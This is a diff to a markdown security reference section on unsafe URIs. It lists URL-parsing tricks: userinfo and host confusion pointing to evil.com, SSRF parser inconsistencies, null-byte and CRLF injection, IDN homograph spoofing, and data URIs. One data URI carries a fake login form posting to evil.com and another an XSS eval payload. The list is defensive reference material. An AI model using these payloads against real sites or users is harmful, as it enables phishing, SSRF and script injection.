@@ -405,14 +405,20 @@ See also
 #### Unsafe URI
 
 - `http://example.com` and `http://example.com.` are the same, but could treated differently (ex: cookies). See [Why does putting a dot after the URL remove login information?](https://superuser.com/questions/1467958/why-does-putting-a-dot-after-the-url-remove-login-information/1468139#1468139)
-- `http://evil.com/@good.com` the domain is not `good.com`
-- `http://good.com%2f@evil.com/` the domain is not `good.com`
-- `file://my.domain/tmp/example.html` the domain is `my.domain`, but often ignored
+- `http://evil.com/@good.com` the domain is `evil.com`
+- `http://good.com%2f@evil.com/` the domain is `evil.com`
+- `https://evil.com/..;@good.com:%344/` the domain is `evil.com`. [HOW FRCKN' HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128 - YouTube](https://www.youtube.com/watch?v=0uejy9aCNbI)
+- `http://1.1.1.1 &@2.2.2.2# @3.3.3.3` (with spaces) the host is `2.2.2.2` RFC 3986: "In some cases, extra whitespace (spaces, line-breaks, tabs, etc.) may have to be added to break a long URI across lines. The whitespace should be ignored when the URI is extracted"
+    - [#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai - YouTube](https://www.youtube.com/watch?v=D1S-G8rJrEk)
+    - [Anomalie 32085 : \[Security\] A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - Python tracker](https://bugs.python.org/issue32085)
+    - [Orange: How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
+    - https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
+- `file://my.domain/tmp/example.html` the domain is `my.domain` (but often ignored)
 - `https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf` (redirect to `evil.swf`) redirection (account login, etc.) don't know if the trusted target, has been compromized (or allow this kind of redirection)
 - `http://good.com%0a%0a%0aTrust%20me.%20It%27s%20totally%20legit.%09%09%09%09%09%0a%0a%0a%0a%0a%0a%0a%0a@evil.com/` is a valid URL, but could be displayed in browser URL bar (or link hover) as `http://good.com`
-- `http://x%0aContent-Length%3a99%0a%0a.victim.website/1` and `http://victim.website%00.attacker.website/evil.html` (null char wrongly used to break the domain as `victim.website`). See [Webkit URLs](https://alf.nu/WebkitURLs)
-- `xn--wkd-8cdx9d7hbd.org` is not equal to `wіkіpеdіа.org`, but look the same in browser address bar It's a valid [IDN](https://en.wikipedia.org/wiki/Internationalized_domain_name#ASCII_spoofing_concerns) which use [punycode](https://en.wikipedia.org/wiki/Punycode) encoding
-- on `http://good.com` URL `//evil.com` the domain is `evil.com`
+- `http://x%0aContent-Length%3a99%0a%0a.good.com/` and `http://good.com%00.evil.com/` (null char wrongly used to break the domain as `victim.website`). See [Webkit URLs](https://alf.nu/WebkitURLs)
+- `xn--wkd-8cdx9d7hbd.org` is not equal to `wіkіpеdіа.org`, but look the same in browser address bar. It's a valid [IDN](https://en.wikipedia.org/wiki/Internationalized_domain_name#ASCII_spoofing_concerns) which use [punycode](https://en.wikipedia.org/wiki/Punycode) encoding
+- on `http://good.com` URL `//evil.com` has the domain `evil.com`
 - filter out data URIs:
 	* `data:text/html;charset=UTF-8,https://good.com/some/long/path/follwed/by/html/<html><body><form action=http://evil.com><button>Fake re-login form</button></form></body></html>`
 	* `data:text/html;charset=UTF-8,alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}`
